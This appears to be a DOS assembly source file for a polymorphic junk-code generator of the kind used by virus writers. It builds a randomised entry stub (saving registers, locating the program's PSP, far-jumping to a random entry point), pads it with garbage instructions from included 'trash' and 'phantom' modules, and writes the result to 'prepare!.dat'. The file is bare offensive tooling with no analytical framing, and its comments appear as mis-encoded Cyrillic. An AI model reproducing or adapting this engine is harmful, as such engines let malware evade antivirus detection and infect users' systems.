   garblelen equ 5

           .386
           MODEL   TINY
   TOSTER      SEGMENT PARA PUBLIC USE16 'CODE'
           ASSUME  CS:TOSTER,DS:TOSTER
           ORG 100H
   START:

           in  ax,40h
           push    ax

           mov dl,al
           and dl,0Fh
           mov byte ptr [TeqEntryOffset],dl

           shr ax,4             ; ‘â àâ¢ë© á¥£¬¥â
           mov word ptr [TeqEntrySEG],ax

           mov ax,cs
           add ax,1000h
           mov es,ax
           xor di,di

           push    di
           mov si,offset PreparePart
           mov cx,9


   MakePrPart:
           push    cx
           lodsb
           mov ch,al
           shr cx,13
           rep movsb
           push si

           and al,1Fh
           mov [REG_USED],al
           and al,0fh
           mov ah,al
           shl ah,4
           or  ah,al
           mov [HALF_USED],ah

           mov cx,GARBLELen
   TrString:
           push    cx
           mov dx,offset RMTRASH
           mov bx,offset SimplyTRASH

           in  al,40h
           mov cl,al
   RNDExch:    xchg    bx,dx
           dec cl
           jnz RNDExch
           call    bx

           pop cx
           loop    TrString
           pop si
           pop cx
           loop    MakePrPart

           pop bx

           mov eax,0ffffffffh
           stosd
           pop ax
           stosw

           sub di,bx


           MOV AH,3CH
           XOR CX,CX
           MOV DX,OFFSET FILE
           INT 21H

           MOV BX,AX

           MOV AH,40H
           xor dx,dx
           mov cx,di
           push    es
           pop ds
           INT 21H

           MOV AH,3EH
           INT 21H

           mov ax,4c00h
           int 21h
   ;-----------------------------
   PreparePart equ $

           db  01010000b    ; REG_USED + 1...4 ¡ ©â  ª®¬ ¤ë
           pushf
           pusha
           db  00110000b
           push    ds
           db  00110000b
           push    es
           db  01010001b    ; AX - ¥ ¯®àâ¨âì
           mov ah,62h
           db  01011000b    ; BX - ¥ ¯®àâ¨âì
           int 21h
           db  10011000b
           add bx,1234h
   TeqEntrySEG equ offset $ - 2
           db  00111000b
           push    bx
           db  01010000b
           push    00h
   TeqEntryOffset  equ offset $ - 1
           db  00110000b
           retf
   EndPrPart   equ $

   ;--------------------------

   file        db 'prepare!.dat',0

   reloffs     dw 0
   dest_code   dw 0
   counter     dw 0
   targetplace dd 0
   lendecryptor    dw 0

   include     phantom.asm
   include     trash.asm

   TOSTER      ENDS
                   END     START
